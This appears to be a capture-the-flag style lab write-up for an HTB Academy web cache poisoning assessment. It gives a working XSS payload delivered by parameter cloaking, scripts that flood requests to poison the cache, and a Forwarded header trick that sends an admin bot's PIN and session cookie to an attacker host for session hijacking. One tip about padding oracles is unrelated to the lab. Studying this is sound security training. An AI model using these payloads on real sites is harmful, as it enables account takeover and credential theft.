# Web Cache Poisoning — Hard Skills Assessment

This chains web cache poisoning via parameter cloaking (CVE-2020-28473 in Python Bottle) with a `Forwarded` header injection to exfiltrate a PIN from an admin bot.

---

## Target Overview

- App: `httpattacks.htb:PORT` — Python Bottle backend behind nginx caching
- Login: `htb-stdnt / Academy_student!`
- vhosts needed: `httpattacks.htb`, `interactsh.local` (both point to same IP)
- Cache expires every ~2 minutes

---

## Recon

After logging in, check the response headers on `/admin/index.html`:
```
X-Powered-By: Python Bottle 0.12.18
X-Cache-Status: MISS / HIT
```

Two key findings:
1. **Bottle 0.12.18** is vulnerable to CVE-2020-28473 — it treats semicolons as parameter separators in query strings
2. **nginx caches responses** — `X-Cache-Status` header shows HIT/MISS/EXPIRED

On `/admin/users.html`:
- There's a notice that the admin bot visits `/admin/users.html?sort_by=role` frequently
- The `sort_by` parameter is reflected in a `<script>sort_table_by("VALUE")</script>` tag — potential XSS
- The `utm_source` parameter is **unkeyed** — changing it doesn't change the cache key
- Promoting htb-stdnt to admin requires the admin to visit `/admin/promote?uid=2`

---

## Step 1: Poison the Cache — XSS via Parameter Cloaking

### The Technique

Bottle parses `utm_source=foo;sort_by=evil` and treats `sort_by=evil` as a separate parameter (because of the semicolon). nginx only keys the cache on `sort_by=role` (the real parameter in the URL), so it thinks it's caching a clean response — but the backend returns the XSS payload.

### XSS Payload

Break out of `sort_table_by("...")` and inject JS:
```javascript
doesNotMatter")</script><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin/promote?uid=2',true);xhr.withCredentials=true;xhr.send();doesNotMatter=("
```

URL-encoded:
```
doesNotMatter%22%29%3C%2Fscript%3E%3Cscript%3Evar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%27%2Fadmin%2Fpromote%3Fuid%3D2%27%2Ctrue%29%3Bxhr.withCredentials%3Dtrue%3Bxhr.send%28%29%3BdoesNotMatter%3D%28%22
```

### Poison Request

```
GET /admin/users.html?sort_by=role&utm_source=index.html;sort_by=ENCODED_XSS
```

The cache key is `/admin/users.html?sort_by=role`. When the admin bot visits that URL, they get the cached poisoned response, which executes the XSS and calls `/admin/promote?uid=2`.

### Catching the Cache Expiry

The cache has a clean version already stored. You need to wait for it to expire (EXPIRED status), then immediately send the poison request so your response gets cached.

```python
import requests, time

TARGET = "http://httpattacks.htb:PORT"
SESSION = "YOUR_SESS_COOKIE"
XSS = "doesNotMatter%22%29%3C%2Fscript%3E%3Cscript%3Evar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%27%2Fadmin%2Fpromote%3Fuid%3D2%27%2Ctrue%29%3Bxhr.withCredentials%3Dtrue%3Bxhr.send%28%29%3BdoesNotMatter%3D%28%22"

print("Flooding poison requests to catch cache expiry...")
while True:
    r = requests.get(
        f"{TARGET}/admin/users.html?sort_by=role&utm_source=index.html;sort_by={XSS}",
        cookies={"sess": SESSION}
    )
    cache = r.headers.get("X-Cache-Status", "")
    script = "doesNotMatter" in r.text
    print(f"cache={cache} poisoned={script}")
    if cache in ("EXPIRED", "MISS") or script:
        print("[+] Poisoned!")
        break
    time.sleep(3)
```

Wait ~30-60 seconds for the admin bot to visit and promote your account.

---

## Step 2: Poison the Sysinfo Page — PIN Exfiltration

After your account is promoted to admin, go to `/admin/sysinfo`. It shows a PIN form:
```html
<form action="http://httpattacks.htb:PORT/admin/sysinfo_pin" method="POST">
```

The form action is built from the `Forwarded` request header. If we cache-poison the `/admin/sysinfo?refresh=1` page with a modified form action, the admin bot (which visits that page automatically) will POST the PIN to our server.

### Finding the Right Header Format

Test different `Forwarded` values to get a clean form action:

```bash
# This produces: action="http://interactsh.local/admin/sysinfo_pin"
curl -s -b "sess=SESSION" \
  "http://httpattacks.htb:PORT/admin/sysinfo?refresh=1" \
  -H "Forwarded: interactsh.local" | grep "action="
```

Use exactly `Forwarded: interactsh.local` (bare hostname, no port, no RFC format). Adding a port gets stripped. Using `host=` prefix adds nginx's `for=127.0.0.1;` garbage to the URL.

### Poison the Sysinfo Cache

Same approach as Step 1 — flood requests with the `Forwarded` header until you catch an EXPIRED response:

```python
import requests, time

TARGET = "http://httpattacks.htb:PORT"
SESSION = "YOUR_SESS_COOKIE"

while True:
    r = requests.get(
        f"{TARGET}/admin/sysinfo?refresh=1",
        cookies={"sess": SESSION},
        headers={"Forwarded": "interactsh.local"}
    )
    cache = r.headers.get("X-Cache-Status", "")
    action = "interactsh.local" in r.text
    print(f"cache={cache} poisoned={action}")
    if cache in ("EXPIRED", "MISS") or action:
        print("[+] Sysinfo poisoned!")
        break
    time.sleep(3)
```

---

## Step 3: Capture the PIN

The admin bot visits `/admin/sysinfo?refresh=1`, gets the poisoned page with `action="http://interactsh.local/admin/sysinfo_pin"`, and POSTs the PIN to `interactsh.local`.

Check the log endpoint:

```bash
curl -s "http://interactsh.local:PORT/log"
```

The response shows the full HTTP request the admin bot made, including:
```
Content-Type: application/x-www-form-urlencoded
Cookie: sess=ADMIN_BOT_SESSION

pin=XXXXXXXXXX
```

Note both the PIN **and the admin bot's session cookie** from the log.

---

## Step 4: Get the Result

Use the **admin bot's session** (from the log) to access `/admin/sysinfo`. The bot has already submitted the PIN so its session is authenticated:

```bash
curl -s -b "sess=ADMIN_BOT_SESSION" "http://httpattacks.htb:PORT/admin/sysinfo"
```

---

## Key Gotchas

- **Always include the dummy trailing block** in padding oracle encryption (different lab, same gotcha class — apply to any oracle attack)
- **Cache waits**: If you accidentally cache a wrong payload, you have to wait a full 2 minutes. Add a cache-buster (`?cb=TIMESTAMP`) to test your payload before poisoning the real cache key
- **Forwarded header format**: `Forwarded: interactsh.local` — bare hostname only
- **Use the bot's session**: Your promoted session can't access sysinfo until you submit the PIN. The bot's session in the log already has the PIN verified
